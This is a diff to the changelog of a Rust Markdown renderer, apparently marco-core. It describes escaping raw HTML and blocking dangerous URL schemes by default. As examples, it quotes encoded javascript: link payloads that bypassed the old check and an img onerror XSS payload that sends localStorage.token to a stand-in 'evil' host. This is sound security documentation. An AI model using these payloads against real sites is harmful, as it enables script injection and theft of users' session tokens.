@@ -51,6 +51,32 @@ scheme before entities were resolved.
 
 ### Changed
 
+#### `RenderOptions::default()` is now safe
+
+The default changes from `HtmlPolicy::Allow` + `UrlPolicy::Allow` to
+`HtmlPolicy::Escape` + `UrlPolicy::BlockDangerous`. **Code that compiles
+unchanged will render differently**: raw HTML is escaped, and `javascript:`,
+`vbscript:`, `file:` and script-capable `data:` URLs no longer produce a link.
+
+```rust
+// 1.x behaviour, now explicitly named
+let html = render(&doc, &RenderOptions::commonmark())?;
+```
+
+`RenderOptions::commonmark()` is **byte-identical to 1.3.3**, verified across
+848 spec fixtures against a committed baseline. The permissive behaviour was not
+removed, only renamed — and safety is what you get for saying nothing.
+
+Every Markdown renderer that takes responsibility for this boundary defaults to
+safe, including cmark, the CommonMark reference implementation, which flipped
+its own default and made the old `CMARK_OPT_SAFE` a permanent no-op. marco-core
+was the outlier.
+
+Your test suite will notice before your users do: any test that renders with
+`default()` and asserts on raw HTML now fails. Three of marco-core's own tests
+had to move to `commonmark()` — the conformance suite, an HTML-block parser
+regression test, and the extension fixture suite.
+
 #### `RenderOptions` is `#[non_exhaustive]`
 
 Struct-literal construction from outside the crate no longer compiles, including
@@ -74,7 +100,42 @@ Configuration serialized by 1.x still loads: both new fields are
 `render_mermaid_diagram(source, theme, allow_interaction)`. Pass `true` for 1.x
 behaviour.
 
+### Fixed
+
+#### `UnsafeLinkProtocol` missed every encoded form of a dangerous scheme
+
+The check read the scheme off the raw link destination, and the parser hands it
+over undecoded. So all of these produced **no warning at all**, while a browser
+decoded each one inside an `href`:
+
+- `[x](javascript&colon;alert(1))`
+- `[x](javascript&#58;alert(1))`
+- `[x](%6aavascript:alert(1))`
+- `[x](java<TAB>script:alert(1))`
+
+Scheme detection now runs on a normalised copy of the URL — HTML character
+references, percent escapes, and embedded whitespace and control characters are
+all resolved before the scheme is read.
+
+#### `UnsafeLinkProtocol` did not know about `vbscript:` or `file:`
+
+The catalog listed only `javascript` and `data`. Both missing schemes are on the
+denylist of every comparable renderer, and both are now detected.
+
 ### Security
+
+#### Raw HTML and unsafe URLs are filtered by default
+
+The policies described above are applied by the renderer, and the default is the
+safe one. A comment body of
+`<img src=x onerror="fetch('//evil/'+localStorage.token)">` is emitted as inert
+text rather than as a live element, and `[Accept](javascript:…)` renders as
+plain text rather than as an anchor that executes on click.
+
+An application that renders Markdown written by one user and displays it to
+another should use `RenderOptions::untrusted()`, which additionally restricts
+URLs to an allowlist of known-safe schemes rather than a denylist of known-bad
+ones — the difference being what happens to a scheme nobody has thought of yet.
 
 #### Mermaid `click` directives could inject a `javascript:` anchor
 
